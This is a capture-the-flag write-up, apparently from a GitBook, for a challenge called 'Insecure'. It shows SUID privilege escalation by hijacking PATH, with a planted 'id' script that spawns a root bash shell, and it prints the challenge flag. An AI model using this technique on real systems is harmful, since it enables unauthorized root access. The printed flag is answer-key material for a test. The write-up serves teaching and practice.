@@ -1,0 +1,52 @@
+<hr />
+
+<h2>description: Privilege escalation through SUID files and PATH variable manipulation</h2>
+
+<h1>Insecure (100)</h1>
+
+<h2>Problem</h2>
+
+<p>Someone once told me that SUID is a bad idea. Could you show me why?</p>
+
+<p>{% file src="../../.gitbook/assets/insecure.bin" %}</p>
+
+<h2>Solution</h2>
+
+<p>The binary calls the <code>id</code> command three times, first without privileges, then as root, then again without privileges.</p>
+
+<p>Since the SUID flag is set, we can manipulate the PATH variable to execute arbitrary code when <code>id</code> is called. The goal is to read the <code>flag.txt</code> file which requires root access. Thus, we need to spawn a shell as root. </p>
+
+<p>The following bash script will only spawn the shell if the caller is root.</p>
+
+<p><code>bash
+if [ `/bin/id -u` = "0" ]; then 
+    echo "I am root" &amp;&amp; /bin/bash
+else 
+    echo "I am not root"
+fi
+</code></p>
+
+<p>Translating this into a one liner and creating our malicious <code>id</code> payload:</p>
+
+<p><code>bash
+$ echo "if [ \`/bin/id -u\` = \"0\" ]; then echo \"I am root\" &amp;&amp; /bin/bash; else echo \"I am not root\"; fi" &gt; id
+</code></p>
+
+<p>PATH variable manipulation:</p>
+
+<p><code>bash
+$ cd /tmp
+$ echo "if [ \`/bin/id -u\` = \"0\" ]; then echo \"I am root\" &amp;&amp; /bin/bash; else echo \"I am not root\"; fi" &gt; id
+$ chmod 777 id
+$ export PATH=/tmp:$PATH
+</code></p>
+
+<p>After running <code>insecure</code>, we obtain a root shell:</p>
+
+<p>```bash
+I am not root
+I am root</p>
+
+<p>$ cat /flag.txt
+DSO-NUS{b4fcfe57b8d2b05ff3310c663a0497b1026cf039baeee18669957152cdc276da}
+```</p>
